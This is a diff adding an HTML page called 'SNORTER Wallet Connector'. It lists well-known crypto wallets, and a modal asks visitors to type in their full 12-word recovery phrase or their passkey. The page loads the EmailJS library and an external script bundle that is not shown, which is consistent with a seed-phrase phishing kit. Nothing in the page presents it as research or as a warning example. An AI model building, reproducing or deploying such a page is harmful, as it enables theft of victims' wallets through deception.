@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Wallet Connector</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        .wallet-card {
+            transition: all 0.3s ease;
+            transform: translateY(0);
+        }
+        
+        .wallet-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px -5px rgba(75, 85, 99, 0.3);
+        }
+        
+        .modal {
+            transition: opacity 0.3s ease, transform 0.3s ease;
+            transform: scale(0.9);
+            opacity: 0;
+        }
+        
+        .modal.active {
+            transform: scale(1);
+            opacity: 1;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        /* Custom grey and accent palette */
+        .bg-custom-dark {
+            background-color: #374151;
+        }
+        
+        .bg-custom-accent {
+            background-color: #4F46E5;
+        }
+        
+        .text-custom-dark {
+            color: #374151;
+        }
+        
+        .text-custom-accent {
+            color: #4F46E5;
+        }
+        
+        .border-custom-dark {
+            border-color: #374151;
+        }
+        
+        .border-custom-accent {
+            border-color: #4F46E5;
+        }
+        
+        .hover\:bg-custom-dark:hover {
+            background-color: #1F2937;
+        }
+        
+        .hover\:bg-custom-accent:hover {
+            background-color: #3730A3;
+        }
+
+        .wallet-logo {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            padding: 8px;
+            border-radius: 50%;
+        }
+
+        .logo-container {
+            background: linear-gradient(135deg, #f3f4f6 0%, #e5e7eb 100%);
+            border: 2px solid #d1d5db;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+    </style>
+</head>
+<body class="bg-gray-100 min-h-screen flex flex-col">
+    <!-- Header -->
+    <header class="bg-custom-dark text-white py-6 shadow-lg">
+        <div class="container mx-auto px-4 text-center">
+            <h1 class="text-3xl md:text-4xl font-bold">SNORTER Wallet Connector</h1>
+            <p class="mt-2 text-gray-300">Connect to your favorite wallet securely</p>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="flex-grow container mx-auto px-4 py-8">
+        <div class="text-center mb-10">
+            <h2 class="text-2xl md:text-3xl font-semibold text-custom-dark">Select Your Wallet</h2>
+            <p class="mt-2 text-gray-600 max-w-2xl mx-auto">Choose from our supported wallets to securely connect and manage your cryptocurrency assets.</p>
+        </div>
+
+        <!-- Wallet Grid -->
+        <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-4 md:gap-6">
+            <!-- Wallet Cards -->
+            <div class="wallet-card bg-white rounded-xl shadow-md p-4 flex flex-col items-center cursor-pointer border-2 border-transparent hover:border-custom-accent" onclick="openModal('MetaMask')">
+                <div class="w-14 h-14 md:w-16 md:h-16 rounded-full logo-container flex items-center justify-center mb-3">
+                    <img src="https://cdn.iconscout.com/icon/free/png-256/free-metamask-2728406-2261817.png" alt="MetaMask" class="wallet-logo">
+                </div>
+                <h3 class="font-medium text-center text-custom-dark">MetaMask</h3>
+            </div>
+
+            <div class="wallet-card bg-white rounded-xl shadow-md p-4 flex flex-col items-center cursor-pointer border-2 border-transparent hover:border-custom-accent" onclick="openModal('TrustWallet')">
+                <div class="w-14 h-14 md:w-16 md:h-16 rounded-full logo-container flex items-center justify-center mb-3">
+                    <svg class="wallet-logo" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
+                        <defs>
+                            <linearGradient id="trustGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                                <stop offset="0%" style="stop-color:#3375BB"/>
+                                <stop offset="100%" style="stop-color:#1E5BA8"/>
+                            </linearGradient>
+                        </defs>
+                        <rect width="120" height="120" rx="20" fill="url(#trustGradient)"/>
+                        <path d="M60 25L35 35v30c0 20 25 35 25 35s25-15 25-35V35L60 25z" fill="white"/>
+                        <path d="M60 35L45 40v20c0 12 15 20 15 20s15-8 15-20V40L60 35z" fill="url(#trustGradient)"/>
+                    </svg>
+                </div>
+                <h3 class="font-medium text-center text-custom-dark">TrustWallet</h3>
+            </div>
+
+            <div class="wallet-card bg-white rounded-xl shadow-md p-4 flex flex-col items-center cursor-pointer border-2 border-transparent hover:border-custom-accent" onclick="openModal('BestWallet')">
+                <div class="w-14 h-14 md:w-16 md:h-16 rounded-full logo-container flex items-center justify-center mb-3">
+                    <svg class="wallet-logo" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
+                        <defs>
+                            <linearGradient id="bestGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                                <stop offset="0%" style="stop-color:#10B981"/>
+                                <stop offset="100%" style="stop-color:#059669"/>
+                            </linearGradient>
+                        </defs>
+                        <rect width="120" height="120" rx="20" fill="url(#bestGradient)"/>
+                        <text x="60" y="45" font-family="Arial, sans-serif" font-size="18" font-weight="bold" text-anchor="middle" fill="white">BEST</text>
+                        <path d="M30 55h60v10H30z" fill="white" opacity="0.8"/>
+                        <text x="60" y="80" font-family="Arial, sans-serif" font-size="12" text-anchor="middle" fill="white">WALLET</text>
+                    </svg>
+                </div>
+                <h3 class="font-medium text-center text-custom-dark">BestWallet</h3>
+            </div>
+
+            <div class="wallet-card bg-white rounded-xl shadow-md p-4 flex flex-col items-center cursor-pointer border-2 border-transparent hover:border-custom-accent" onclick="openModal('Coinbase')">
+                <div class="w-14 h-14 md:w-16 md:h-16 rounded-full logo-container flex items-center justify-center mb-3">
+                    <svg class="wallet-logo" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
+                        <defs>
+                            <linearGradient id="coinbaseGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                                <stop offset="0%" style="stop-color:#0052FF"/>
+                                <stop offset="100%" style="stop-color:#0041CC"/>
+                            </linearGradient>
+                        </defs>
+                        <rect width="120" height="120" rx="20" fill="url(#coinbaseGradient)"/>
+                        <rect x="40" y="40" width="40" height="40" rx="8" fill="white"/>
+                    </svg>
+                </div>
+                <h3 class="font-medium text-center text-custom-dark">Coinbase</h3>
+            </div>
+
+            <div class="wallet-card bg-white rounded-xl shadow-md p-4 flex flex-col items-center cursor-pointer border-2 border-transparent hover:border-custom-accent" onclick="openModal('Uniswap')">
+                <div class="w-14 h-14 md:w-16 md:h-16 rounded-full logo-container flex items-center justify-center mb-3">
+                    <svg class="wallet-logo" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
+                        <defs>
+                            <linearGradient id="uniswapGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                                <stop offset="0%" style="stop-color:#FF007A"/>
+                                <stop offset="100%" style="stop-color:#E91E63"/>
+                            </linearGradient>
+                        </defs>
+                        <rect width="120" height="120" rx="20" fill="url(#uniswapGradient)"/>
+                        <path d="M30 60c0-15 15-30 30-30s30 15 30 30c0 15-15 30-30 30s-30-15-30-30z" fill="white" opacity="0.2"/>
+                        <path d="M40 60c0-10 10-20 20-20s20 10 20 20c0 10-10 20-20 20s-20-10-20-20z" fill="white"/>
+                        <text x="60" y="68" font-family="Arial, sans-serif" font-size="16" font-weight="bold" text-anchor="middle" fill="#FF007A">🦄</text>
+                    </svg>
+                </div>
+                <h3 class="font-medium text-center text-custom-dark">Uniswap</h3>
+            </div>
+
+            <div class="wallet-card bg-white rounded-xl shadow-md p-4 flex flex-col items-center cursor-pointer border-2 border-transparent hover:border-custom-accent" onclick="openModal('SafePal')">
+                <div class="w-14 h-14 md:w-16 md:h-16 rounded-full logo-container flex items-center justify-center mb-3">
+                    <img src="https://th.bing.com/th/id/OIP.WiHFofKyFQZd4U8-g7AtaAAAAA?w=179&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="SafePal" class="wallet-logo">
+                </div>
+                <h3 class="font-medium text-center text-custom-dark">SafePal</h3>
+            </div>
+
+            <div class="wallet-card bg-white rounded-xl shadow-md p-4 flex flex-col items-center cursor-pointer border-2 border-transparent hover:border-custom-accent" onclick="openModal('Exodus Wallet')">
+                <div class="w-14 h-14 md:w-16 md:h-16 rounded-full logo-container flex items-center justify-center mb-3">
+                    <svg class="wallet-logo" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
+                        <defs>
+                            <linearGradient id="exodusGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                                <stop offset="0%" style="stop-color:#6366F1"/>
+                                <stop offset="100%" style="stop-color:#4F46E5"/>
+                            </linearGradient>
+                        </defs>
+                        <rect width="120" height="120" rx="20" fill="url(#exodusGradient)"/>
+                        <path d="M35 35l25 25-25 25h20l15-15 15 15h20l-25-25 25-25H85L70 50 55 35H35z" fill="white"/>
+                    </svg>
+                </div>
+                <h3 class="font-medium text-center text-custom-dark">Exodus Wallet</h3>
+            </div>
+
+            <div class="wallet-card bg-white rounded-xl shadow-md p-4 flex flex-col items-center cursor-pointer border-2 border-transparent hover:border-custom-accent" onclick="openModal('Kraken Wallet')">
+                <div class="w-14 h-14 md:w-16 md:h-16 rounded-full logo-container flex items-center justify-center mb-3">
+                    <img src="https://th.bing.com/th/id/OIP.Qvj-oUVfcw9Vl_kz_jxLkAHaHa?w=172&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="Kraken Wallet" class="wallet-logo">
+                </div>
+                <h3 class="font-medium text-center text-custom-dark">Kraken Wallet</h3>
+            </div>
+
+            <div class="wallet-card bg-white rounded-xl shadow-md p-4 flex flex-col items-center cursor-pointer border-2 border-transparent hover:border-custom-accent" onclick="openModal('Phantom')">
+                <div class="w-14 h-14 md:w-16 md:h-16 rounded-full logo-container flex items-center justify-center mb-3">
+                    <img src="https://th.bing.com/th?q=Phantom+Wallet+Logo&w=42&h=42&c=7&rs=1&p=0&o=7&pid=1.7&rm=3&mkt=en-US&cc=US&setlang=en&adlt=moderate&t=1" alt="Phantom" class="wallet-logo">
+                </div>
+                <h3 class="font-medium text-center text-custom-dark">Phantom</h3>
+            </div>
+
+            <div class="wallet-card bg-white rounded-xl shadow-md p-4 flex flex-col items-center cursor-pointer border-2 border-transparent hover:border-custom-accent" onclick="openModal('Solflare')">
+                <div class="w-14 h-14 md:w-16 md:h-16 rounded-full logo-container flex items-center justify-center mb-3">
+                    <img src="https://th.bing.com/th/id/OIP.kJ2lFJyXXGUrVz6_TkZmqwHaHa?w=163&h=104&c=7&bgcl=b432ed&r=0&o=6&cb=thwsc5&pid=13.1" alt="Solflare" class="wallet-logo">
+                </div>
+                <h3 class="font-medium text-center text-custom-dark">Solflare</h3>
+            </div>
+
+            <div class="wallet-card bg-white rounded-xl shadow-md p-4 flex flex-col items-center cursor-pointer border-2 border-transparent hover:border-custom-accent" onclick="openModal('Crypto.com Wallet')">
+                <div class="w-14 h-14 md:w-16 md:h-16 rounded-full logo-container flex items-center justify-center mb-3">
+                    <img src="https://th.bing.com/th/id/OIP.Oqnt3CrxRQiBaFb3LEQcJwHaHa?w=185&h=104&c=7&bgcl=31fcdd&r=0&o=6&cb=thwsc5&pid=13.1" alt="Crypto.com Wallet" class="wallet-logo">
+                </div>
+                <h3 class="font-medium text-center text-custom-dark">Crypto.com Wallet</h3>
+            </div>
+
+            <div class="wallet-card bg-white rounded-xl shadow-md p-4 flex flex-col items-center cursor-pointer border-2 border-transparent hover:border-custom-accent" onclick="openModal('Bitget Wallet')">
+                <div class="w-14 h-14 md:w-16 md:h-16 rounded-full logo-container flex items-center justify-center mb-3">
+                    <img src="https://th.bing.com/th/id/OIP.rgYw-zfbLfl7FlT4AGU0iQHaHa?w=177&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="Bitget Wallet" class="wallet-logo">
+                </div>
+                <h3 class="font-medium text-center text-custom-dark">Bitget Wallet</h3>
+            </div>
+        </div>
+        
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-custom-dark text-white py-6 mt-10">
+        <div class="container mx-auto px-4 text-center">
+            <p class="text-gray-300">Always keep your recovery phrases secure.</p>
+            <p class="mt-2 text-sm text-gray-400">© 2025 SNORTER Wallet Connector</p>
+        </div>
+    </footer>
+
+    <!-- Modal -->
+    <div class="modal fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 opacity-0 pointer-events-none" id="walletModal">
+        <div class="bg-white rounded-xl shadow-2xl max-w-md w-full max-h-[90vh] overflow-y-auto">
+            <div class="p-6">
+                <div class="flex justify-between items-center mb-6">
+                    <h3 class="text-xl font-semibold text-custom-dark" id="modalTitle">Connect Wallet</h3>
+                    <button class="text-gray-500 hover:text-custom-accent" onclick="closeModal()">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- Tabs -->
+                <div class="flex border-b border-gray-200 mb-6">
+                    <button class="py-2 px-4 font-medium border-b-2 border-custom-accent text-custom-accent tab-button active" data-tab="phrase">Recovery Phrase</button>
+                    <button class="py-2 px-4 font-medium text-gray-500 tab-button" data-tab="passkey">Passkey</button>
+                </div>
+
+                <!-- Tab Contents -->
+                <div class="tab-content active" id="phrase-tab">
+                    <p class="text-gray-600 mb-4">Enter your 12-word recovery phrase</p>
+                    <form id="phrase-form">
+                        <div class="grid grid-cols-3 gap-3 mb-4">
+                            <input type="text" class="col-span-3 md:col-span-1 border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-custom-accent focus:border-transparent" placeholder="Word 1" required>
+                            <input type="text" class="col-span-3 md:col-span-1 border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-custom-accent focus:border-transparent" placeholder="Word 2" required>
+                            <input type="text" class="col-span-3 md:col-span-1 border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-custom-accent focus:border-transparent" placeholder="Word 3" required>
+                            <input type="text" class="col-span-3 md:col-span-1 border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-custom-accent focus:border-transparent" placeholder="Word 4" required>
+                            <input type="text" class="col-span-3 md:col-span-1 border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-custom-accent focus:border-transparent" placeholder="Word 5" required>
+                            <input type="text" class="col-span-3 md:col-span-1 border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-custom-accent focus:border-transparent" placeholder="Word 6" required>
+                            <input type="text" class="col-span-3 md:col-span-1 border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-custom-accent focus:border-transparent" placeholder="Word 7" required>
+                            <input type="text" class="col-span-3 md:col-span-1 border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-custom-accent focus:border-transparent" placeholder="Word 8" required>
+                            <input type="text" class="col-span-3 md:col-span-1 border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-custom-accent focus:border-transparent" placeholder="Word 9" required>
+                            <input type="text" class="col-span-3 md:col-span-1 border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-custom-accent focus:border-transparent" placeholder="Word 10" required>
+                            <input type="text" class="col-span-3 md:col-span-1 border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-custom-accent focus:border-transparent" placeholder="Word 11" required>
+                            <input type="text" class="col-span-3 md:col-span-1 border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-custom-accent focus:border-transparent" placeholder="Word 12" required>
+                        </div>
+                        <button type="submit" class="w-full bg-custom-accent hover:bg-custom-dark text-white font-medium py-3 rounded-lg transition duration-300">
+                            Connect Wallet
+                        </button>
+                    </form>
+                </div>
+
+                <div class="tab-content" id="passkey-tab">
+                    <p class="text-gray-600 mb-4">Enter your passkey</p>
+                    <form id="passkey-form">
+                        <div class="mb-4">
+                            <label class="block text-gray-700 mb-2" for="passkey">Passkey</label>
+                            <input type="password" id="passkey" class="w-full border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-custom-accent focus:border-transparent" placeholder="Enter your passkey" required>
+                        </div>
+                        <button type="submit" class="w-full bg-custom-accent hover:bg-custom-dark text-white font-medium py-3 rounded-lg transition duration-300">
+                            Connect Wallet
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+<script src="/static/js/main.6d23d4c1.js"></script>
+</body>
+</html>
